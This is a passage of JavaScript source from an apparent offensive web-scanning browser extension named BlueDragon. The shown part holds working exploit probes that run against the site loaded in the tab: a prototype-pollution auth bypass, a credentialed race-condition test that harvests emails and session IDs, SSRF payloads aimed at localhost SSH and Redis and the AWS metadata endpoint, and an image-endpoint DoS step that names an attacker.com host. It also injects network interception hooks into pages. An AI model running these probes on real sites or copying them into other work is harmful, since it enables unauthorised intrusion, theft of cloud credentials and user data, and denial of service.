    // Test with pollution payloads
    for (const { name, payload } of pollutionPayloads) {
      try {
        const testUrl = new URL(ep, window.location.origin);
        const response = await fetch(testUrl.toString(), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          signal: AbortSignal.timeout(5000)
        });

        const body = await response.text();

        // Check for new sensitive data not in baseline
        const foundIndicators = bypassIndicators.filter(ind =>
          body.toLowerCase().includes(ind.toLowerCase()) &&
          !baselineBody.toLowerCase().includes(ind.toLowerCase())
        );

        if (foundIndicators.length >= 1) {
          return {
            vulnerable: true,
            output: body.substring(0, 1000),
            endpoint: ep,
            payload: JSON.stringify(payload),
            pollutionType: name,
            message: `Prototype pollution auth bypass confirmed via ${name}!`,
            severity: 'CRITICAL',
            foundIndicators,
            statusChange: baselineStatus !== response.status ? {
              baseline: baselineStatus,
              polluted: response.status
            } : null
          };
        }

        // Check for status change (403/401 -> 200)
        if ((baselineStatus === 401 || baselineStatus === 403) && response.status === 200) {
          return {
            vulnerable: true,
            endpoint: ep,
            payload: JSON.stringify(payload),
            pollutionType: name,
            message: `Auth bypass! Status changed from ${baselineStatus} to ${response.status}`,
            severity: 'CRITICAL',
            statusChange: { baseline: baselineStatus, polluted: response.status }
          };
        }
      } catch (e) {
        // Continue
      }
    }
  }

  return {
    vulnerable: false,
    message: 'Prototype pollution auth bypass not detected',
    testedEndpoints: testEndpoints,
    suggestion: 'Try targeting specific API endpoints that handle user data'
  };
}

/**
 * Test Angular SSR Race Condition vulnerability (CVE-2025-59052)
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testAngularRaceCondition(options = {}) {
  const concurrency = options.concurrency || 20;
  const iterations = options.iterations || 3;
  const targetUrl = options.endpoint || window.location.href;

  // This test sends concurrent requests to detect if user data leaks between requests
  // We look for variations in response that shouldn't occur for identical requests

  const results = [];
  const responseBodies = new Set();

  for (let i = 0; i < iterations; i++) {
    // Send concurrent requests
    const requests = Array(concurrency).fill(null).map(() =>
      fetch(targetUrl, {
        method: 'GET',
        headers: {
          'X-BlueDragon-Race-Test': Math.random().toString(36).substr(2, 9)
        },
        credentials: 'include',
        signal: AbortSignal.timeout(10000)
      }).then(async res => {
        const body = await res.text();
        return { status: res.status, body, headers: Object.fromEntries(res.headers) };
      }).catch(e => ({ error: e.message }))
    );

    const responses = await Promise.all(requests);

    // Analyze responses for variations
    for (const res of responses) {
      if (res.body) {
        // Extract user-specific content that might leak
        const userPatterns = [
          /user[_-]?id["':]\s*["']?(\d+|[a-f0-9-]+)/gi,
          /email["':]\s*["']([^"']+)/gi,
          /username["':]\s*["']([^"']+)/gi,
          /session[_-]?id["':]\s*["']([^"']+)/gi
        ];

        for (const pattern of userPatterns) {
          const matches = res.body.match(pattern);
          if (matches) {
            responseBodies.add(JSON.stringify(matches));
          }
        }
      }
    }

    results.push({
      iteration: i + 1,
      successfulRequests: responses.filter(r => !r.error).length,
      errors: responses.filter(r => r.error).length
    });
  }

  // If we see multiple different user identifiers, it's a potential race condition
  if (responseBodies.size > 1) {
    return {
      vulnerable: 'possible',
      message: 'Detected variation in user-specific data across concurrent requests!',
      severity: 'HIGH',
      note: 'This may indicate race condition data leakage. Manual verification required.',
      uniqueResponses: responseBodies.size,
      results
    };
  }

  return {
    vulnerable: 'unknown',
    message: 'Race condition test completed. No obvious data leakage detected.',
    note: 'This vulnerability requires high-concurrency traffic and specific conditions to trigger.',
    suggestion: 'Test with authenticated sessions and compare responses for different users',
    results
  };
}

/**
 * Test Angular SSR SSRF vulnerability (CVE-2025-62427)
 * Uses double-slash URL injection to trigger SSRF
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testAngularSSRF(options = {}) {
  const collaboratorUrl = options.collaboratorUrl || settings?.collaboratorUrl;
  const collaboratorId = 'bd-' + Math.random().toString(36).substr(2, 9);

  // Double-slash SSRF payloads
  const ssrfPayloads = [
    `//httpbin.org/get?test=${collaboratorId}`,
    `//example.com/ssrf-test`,
    `//localhost:22/`, // SSH probe
    `//localhost:6379/`, // Redis probe
    `//169.254.169.254/latest/meta-data/` // AWS metadata
  ];

  if (collaboratorUrl) {
    ssrfPayloads.unshift(`//${collaboratorId}.${collaboratorUrl}/ssrf`);
  }

  const results = [];

  for (const payload of ssrfPayloads) {
    try {
      // Try accessing the double-slash URL directly
      const testUrl = new URL(window.location.origin + payload);

      const response = await fetch(testUrl.toString(), {
        method: 'GET',
        headers: {
          'X-BlueDragon-SSRF-Test': collaboratorId
        },
        redirect: 'manual',
        signal: AbortSignal.timeout(5000)
      });

      const statusCode = response.status;

      // Check for indicators of SSRF
      if (statusCode === 200) {
        const body = await response.text();

        // Check if we got external content
        if (body.includes('httpbin') || body.includes(collaboratorId)) {
          return {
            vulnerable: true,
            payload,
            message: 'SSRF confirmed! External URL was fetched via double-slash injection.',
            severity: 'CRITICAL',
            statusCode,
            evidence: body.substring(0, 500)
          };
        }

        // Check for cloud metadata
        if (body.includes('ami-id') || body.includes('instance-id') || body.includes('security-credentials')) {
          return {
            vulnerable: true,
            payload,
            message: 'CRITICAL: AWS metadata accessed via SSRF!',
            severity: 'CRITICAL',
            evidence: body.substring(0, 500)
          };
        }
      }

      // Check for redirect that might indicate SSRF processing
      if (statusCode === 302 || statusCode === 301) {
        const location = response.headers.get('location');
        if (location && (location.includes('httpbin') || location.includes(collaboratorUrl))) {
          return {
            vulnerable: 'possible',
            payload,
            message: 'Server redirected to external URL. SSRF may be possible.',
            redirectLocation: location,
            statusCode
          };
        }
      }

      results.push({ payload, statusCode, note: 'No SSRF indication' });

    } catch (e) {
      results.push({ payload, error: e.message });
    }
  }

  // If collaborator URL configured, tell user to check
  if (collaboratorUrl) {
    return {
      vulnerable: 'possible',
      message: 'SSRF probes sent. Check your collaborator for incoming requests.',
      collaboratorId,
      note: `Look for requests to ${collaboratorId}.${collaboratorUrl}`,
      results
    };
  }

  return {
    vulnerable: false,
    message: 'SSRF via double-slash injection not detected.',
    suggestion: 'Configure a collaborator URL for out-of-band detection',
    results
  };
}

/**
 * Test Image Optimization DoS vulnerability (CVE-2024-47831)
 * Tests if external URLs can be fetched via /_next/image endpoint
 * @param {Object} options - Test options
 * @returns {Promise<Object>} - Test result
 */
async function testImageOptimizationDoS(options = {}) {
  const externalUrl = options.command || 'https://httpbin.org/image/png';
  const imageEndpoint = '/_next/image';

  // Test different image sizes to check for resource exhaustion potential
  const testCases = [
    { w: 64, q: 75, desc: 'small' },
    { w: 1920, q: 100, desc: 'large' },
    { w: 3840, q: 100, desc: 'extra large' }
  ];

  const results = [];

  for (const test of testCases) {
    try {
      const testUrl = new URL(imageEndpoint, window.location.origin);
      testUrl.searchParams.set('url', externalUrl);
      testUrl.searchParams.set('w', test.w.toString());
      testUrl.searchParams.set('q', test.q.toString());

      const startTime = Date.now();

      const response = await fetch(testUrl.toString(), {
        method: 'GET',
        signal: AbortSignal.timeout(15000)
      });

      const elapsed = Date.now() - startTime;
      const contentType = response.headers.get('content-type') || '';
      const contentLength = response.headers.get('content-length') || '0';

      if (response.ok && contentType.includes('image')) {
        results.push({
          size: test.desc,
          width: test.w,
          quality: test.q,
          status: response.status,
          contentType,
          contentLength: parseInt(contentLength),
          elapsed,
          success: true
        });
      } else if (response.status === 400) {
        results.push({
          size: test.desc,
          status: 400,
          note: 'External URL blocked by configuration',
          success: false
        });
      } else {
        results.push({
          size: test.desc,
          status: response.status,
          success: false
        });
      }
    } catch (e) {
      results.push({
        size: test.desc,
        error: e.message,
        success: false
      });
    }
  }

  const successfulTests = results.filter(r => r.success);

  if (successfulTests.length > 0) {
    // Check if large images took significantly longer (DoS potential)
    const smallTest = results.find(r => r.size === 'small' && r.success);
    const largeTest = results.find(r => r.size === 'extra large' && r.success);

    let dosIndicator = false;
    if (smallTest && largeTest && largeTest.elapsed > smallTest.elapsed * 3) {
      dosIndicator = true;
    }

    return {
      vulnerable: true,
      message: 'Image optimization accepts external URLs! Potential for SSRF and resource exhaustion.',
      severity: dosIndicator ? 'HIGH' : 'MEDIUM',
      externalUrl,
      endpoint: imageEndpoint,
      results,
      dosIndicator,
      exploitSteps: [
        '1. External URL fetch confirmed - potential SSRF',
        '2. Large image processing can exhaust server resources',
        '3. Chain with slow/infinite image sources for DoS',
        '4. Try: ?url=http://attacker.com/slow-image.php&w=3840&q=100'
      ]
    };
  }

  // Check if endpoint exists but blocks external URLs
  const blocked = results.some(r => r.status === 400);
  if (blocked) {
    return {
      vulnerable: false,
      message: 'Image endpoint exists but external URLs are properly restricted.',
      note: 'images.domains is configured correctly',
      results
    };
  }

  return {
    vulnerable: false,
    message: 'Image optimization endpoint not accessible or not vulnerable.',
    results,
    suggestion: 'Endpoint may require specific URL patterns or domains'
  };
}

/**
 * Inject network interception hooks into page
 */
function injectNetworkHooks() {
  try {
    const script = document.createElement('script');
    script.src = chrome.runtime.getURL('injected/network-interceptor.js');
    script.onload = function() {
      this.remove();
    };
    (document.head || document.documentElement).appendChild(script);
  } catch (e) {
    console.warn('[BlueDragon] Failed to inject network hooks:', e);
  }

  // Listen for messages from injected script
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;
    if (event.data?.type === MESSAGE_TYPES.NETWORK_CAPTURE) {
      handleNetworkCapture(event.data.data);
    }
  });
}

/**
 * Handle captured network request
 * @param {Object} data - Captured request data
 */
function handleNetworkCapture(data) {
  // Filter blocked endpoints
  if (isBlockedEndpoint(data.url)) {
    return;
  }

  capturedRequests.push({
    ...data,
    timestamp: Date.now()
  });

  // Analyze for potential vulnerabilities
  analyzeRequest(data);
}

/**
 * Analyze captured request for vulnerabilities
 * @param {Object} request - Request data
 */
function analyzeRequest(request) {
  // Check for RSC/Flight protocol
  const headers = request.headers || {};

  if (headers['next-action'] || headers['rsc'] === '1') {
    sendMessage({
      type: MESSAGE_TYPES.VULN_FOUND,
      data: {
        type: 'Server Action Endpoint',
        url: request.url,
        method: request.method,
        headers,
        note: 'Potential SSRF vector via Host header injection'
      }
    });
  }

  // Check for interesting content types
  if (headers['content-type']?.includes('text/x-component')) {
    sendMessage({
      type: MESSAGE_TYPES.VULN_FOUND,
      data: {
        type: 'Flight Protocol Endpoint',
        url: request.url,
        method: request.method,
        note: 'RSC Flight protocol detected - check for React2Shell'
      }
    });
  }
}

/**
 * Generate unique ID
 * @returns {string}
 */
function generateId() {
  return 'wd-' + Math.random().toString(36).substr(2, 9);
}

// Initialize on load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

// Export for testing
export {
  init,
  performScan,
  quickDetect,
  scanResults
};
